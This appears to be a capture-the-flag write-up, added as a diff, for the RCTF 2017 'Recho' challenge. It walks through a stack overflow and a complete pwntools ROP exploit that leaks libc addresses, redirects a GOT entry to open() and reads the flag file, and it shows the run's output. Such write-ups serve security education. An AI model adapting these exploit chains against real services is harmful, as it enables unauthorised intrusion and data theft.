@@ -1,0 +1,350 @@
+
+= Recho
+'hop_e___'
+1.0, 2016-05-24
+:toc:
+:toc-placement: preamble
+:icons: font
+
+
+Writeup for the `Recho` pwn challange from RCTF 2017.
+
+
+== Overwiev
+
+The supplied zip file contains only a binary.
+
+Analyzing the binary shows that the main function looks something like this:
+[source,c]
+----
+int main(int argc, char* argv[]) {
+    char length_buf[0x10];
+    char input_buf[0x10];
+    int input_len, n_read;
+
+    Init();
+
+    write(1, "Welcome to Recho server!.",0x19);
+    while(read(0, length_buf, 0x10) != 0) {
+        input_len = atoi(lenght_buf);
+
+        n_read = read(0, input_buf, input_len); // <1>
+        input_buf[n_read] = '\0';
+
+        printf("%s", input_buf);
+    }
+    return 0;
+}
+----
+
+<1> Buffer overflow!
+
+There is an obvious stack buffer overflow because the input_len is not checked.
+
+It is important to note that main will only return if the call to read
+returns 0 i.e. stdin is closed.
+
+My usual approach to a challenge like this would be to send a rop-chain
+to leak some pointers, then use the leaked addresses to generate a
+rop chain that will give us a shell.
+However because we have to close stdin to trigger the first rop-chain,
+we would have no way to send the second one.
+
+Another interesting observation is that the binary contains the string "flag".
+
+== Approach
+
+We have to use Return Oriented Programming because the binary has the NX-bit enabled.
+When I looked at the output of ROPgadget I noticed one particularly
+useful gadget:
+
+....
+$ ROPgadget  --binary Recho
+[...]
+0x000000000040070d : add byte ptr [rdi], al ; ret
+[...]
+....
+
+Since the binary also contains gadgets that allow us to control rdi and
+rax, we can use this gadget to add an offset to an entry in the GOT,
+effectivly pointing it to another libc function, and defeating ASLR.
+
+I chose to change the GOT entry for write to point to open.
+This will allow us to use the "flag" string to open the flag file.
+We can then read its contents into memory and print them to stdout
+(read and printf are in the PLT which is not randomized)
+
+
+
+== Exploit
+
+=== Helper Functions
+First I defined a bunch of helper functions that make creatioin of the rop-chains
+easier. I found all the gadgets using ROPgadget.
+
+[source,python]
+----
+#!/usr/bin/env python2
+
+from pwn import *
+
+def rop_pop_rdi(val):
+    '''
+    generates rop chain to place val into rdi
+    '''
+    return p64(0x00000000004008a3) + p64(val)
+
+def rop_pop_rsi(val):
+    '''
+    generates rop chain to place val into rsi
+    '''
+    return p64(0x00000000004008a1) + p64(val) + p64(0) + rop_nop()
+
+#0x00000000004006fc : pop rax ; ret
+def rop_pop_rax(val):
+    '''
+    generates rop chain to place val into rax
+    '''
+    return p64(0x00000000004006fc) + p64(val)
+
+#0x00000000004006fe
+def rop_pop_rdx(val):
+    '''
+    generates rop chain to place val into rdx
+    '''
+    return p64(0x00000000004006fe) + p64(val)
+
+#0x000000000040070d : add byte ptr [rdi], al ; ret
+def rop_add_byte(ptr, val):
+    '''
+    generates rop chain  to add val to the byte at [ptr]
+    '''
+    # convert signed 8 bit integers unsigned 64 bit int
+    v = u64(pack(val, word_size=8).ljust(8, '\x00'))
+    return rop_pop_rdi(ptr) + rop_pop_rax(v) + p64(0x000000000040070d) + rop_nop()
+
+def rop_read(fd, buf, n):
+    '''
+    generates rop chain  to call read(fd, buf, n)
+    '''
+    return ''.join([
+        rop_pop_rdi(fd),
+        rop_pop_rsi(buf),
+        rop_pop_rdx(n),
+        p64(0x00400600),
+        rop_nop(),
+    ])
+
+def rop_printf(f):
+    '''
+    generates rop chain  to call printf(f)
+    '''
+    return ''.join([
+        rop_pop_rdi(f),
+        p64(0x004005e0),
+        rop_nop(),
+    ])
+
+
+def rop_printf_s(str):
+    '''
+    generates rop chain  to call printf("%s", str).
+    NOTE: this gadget will not return. Use it only as the last gadget
+    in a chain.
+    '''
+    # 0x004005e0 16 sym.imp.printf
+    #    ; "%s"
+    # 0x00400802 488d3dd50000.  lea rdi, qword 0x004008de
+    # 0x00400809 b800000000     mov eax, 0
+    # 0x0040080e e8cdfdffff     call sym.imp.printf;[gj]
+    printf_gadget = 0x00400802
+    return ''.join([
+        rop_pop_rsi(str),
+        p64(printf_gadget),
+        rop_nop(),
+    ])
+
+
+def rop_open(path):
+    '''
+    generates rop chain open(path, 0)
+    uses the modified GOT entry for write
+    '''
+    return ''.join([
+        rop_pop_rdi(path),
+        rop_pop_rsi(0),
+        p64(0x004005d0),
+        rop_nop(),
+    ])
+
+def rop_nop():
+    '''
+    generates rop that just increments rsp by 8 (just one ret)
+    '''
+    return p64(0x4008a4)
+----
+
+
+=== Information Collection
+
+We don't know exactly what libc version is
+used on the server. To find out I leaked the GOT and used https://github.com/niklasb/libc-database[this]
+database to determine the exact libc version.
+
+
+[source,python]
+----
+def leak_ptr(addr):
+    '''
+    leaks a pointer at addr
+    will fail if the lowest byte of the pointer contains 0x00
+    '''
+    # build rop chain
+    inp  = '\x00' + cyclic(0x2f) # padding
+    inp += 'A' * 8 # fake rbp
+    inp += rop_printf_s(addr)
+
+
+    #t = process(['./Recho'])
+    t = remote('recho.2017.teamrois.cn', 9527, level='ERROR')
+
+    # send length of input
+    t.sendline(str(len(inp)).ljust(15))
+
+    # send input, this overflows the stack buffer
+    t.sendline(inp)
+
+    # make main return and execute the rop chain
+    t.shutdown()
+
+    # discard welcome message
+    t.recvuntil('server!\n')
+
+    s = t.recvall()
+    return hex(u64(s[:8].ljust(8, '\x00')))
+
+log.info('atoi: ' + leak_ptr(0x601040))
+log.info('read: ' + leak_ptr(0x601030))
+log.info('setvbuf: ' + leak_ptr(0x601038))
+log.info('alarm: ' + leak_ptr(0x4005f0))
+log.info('write: ' + leak_ptr(0x601018))
+----
+
+this gives us an output like this:
+
+....
+[*] atoi: 0x7ff767321e80
+[*] read: 0x7fc9e2869670
+[*] setvbuf: 0x7f79bcd0fe70
+[*] alarm: 0x200a3225ff
+[*] write: 0x7f7f9e57e6d0
+....
+
+The addresses all come from different runs of the binary, so they are all offsets
+from a different randomized libc base address.
+However this does not matter since we only  care about the lowest
+(not randomized) 12 bit anyway.
+
+Using the leaked information and the `find` script that comes with the libc database
+we can determine the exact libc version used.
+....
+$ ./find atoi e80 read 670 setvbuf e70
+ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu7_amd64)
+....
+
+=== Exploitation
+
+Next we have to get the offset between
+write and open. To do that we use the dump script from the libc database:
+
+....
+$ ./dump libc6_2.23-0ubuntu7_amd64 write open
+offset_write = 0x00000000000f66d0
+offset_open = 0x00000000000f6450
+....
+
+We calculate the offsets
+for the last two bytes individually, because the add gadget only adds one byte at a time:
+
+....
+$ python2 -c 'print 0x64 - 0x66'
+-2
+$ python2 -c 'print 0x50 - 0xd0'
+-128
+....
+
+Now we can use these values to change the GOT entry for write to point
+to open. Then we can open the flag file and print its content to
+stdout:
+
+[source,python]
+----
+
+
+def make_rop():
+    '''
+    builds the rop chain to leak the flag
+    '''
+    return ''.join([
+        # NOP to keep the stack 16 byte aligned
+        rop_nop(),
+        # change write got entry to open by adding the correct offset
+
+        # addres of write in GOT: 0x601018
+        rop_add_byte(0x601018 + 0, -128),
+        rop_add_byte(0x601018 + 1, -2),
+
+
+        # address of string "flag":
+        # 0x00601058
+
+        # open the flag using the modified GOT
+
+        rop_open(0x00601058),
+
+        # read the flag from the flag file
+        # the newly opened file will have fd 3
+        rop_read(3, 0x601f00, 100),
+
+        # print the flag
+        rop_printf(0x601f00),
+    ])
+
+def leak_flag():
+    inp  = '\x00' + cyclic(0x2f) # padding to overflow the buffer
+    inp += 'A' * 8 # fake stored rbp
+
+    inp += make_rop() # rop chain
+
+    #t = process(['./Recho'])
+    t = remote('recho.2017.teamrois.cn', 9527)
+
+    # send lenght of input
+    t.sendline(str(len(inp)).ljust(15))
+
+    # send our input. This will overflow the stack buffer
+    t.sendline(inp)
+
+    # close the send direction of the socket to make main return
+    # and execute our rop chain
+    t.shutdown()
+
+    # discard the welcome message
+    t.recvuntil('server!\n')
+
+    # recive the flag :D
+    return t.recvall()
+
+log.success(leak_flag())
+----
+
+This gives us:
+
+....
+[+] Opening connection to recho.2017.teamrois.cn on port 9527: Done
+[+] Receiving all data: Done (30B)
+[*] Closed connection to recho.2017.teamrois.cn port 9527
+[+] RCTF{l0st_1n_th3_3ch0_d6794b}
+....
+
+
